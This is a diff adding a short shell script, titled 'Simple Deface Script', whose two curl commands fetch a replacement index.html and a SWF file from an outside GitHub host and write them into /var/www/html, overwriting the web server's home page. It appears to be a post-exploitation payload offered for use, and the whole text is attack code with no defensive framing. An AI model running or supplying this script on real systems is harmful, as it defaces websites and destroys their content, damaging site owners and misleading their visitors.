@@ -1,0 +1,7 @@
+#!/bin/sh
+# Name: Simple Deface Script
+# License: GPLv3
+# Credits: Daniel Teixeira
+
+curl -o /var/www/html/index.html https://raw.githubusercontent.com/DanielRTeixeira/Web/master/Stuff/index.html
+curl -o /var/www/html/umbrella.swf https://raw.githubusercontent.com/DanielRTeixeira/Web/master/Stuff/umbrella.swf
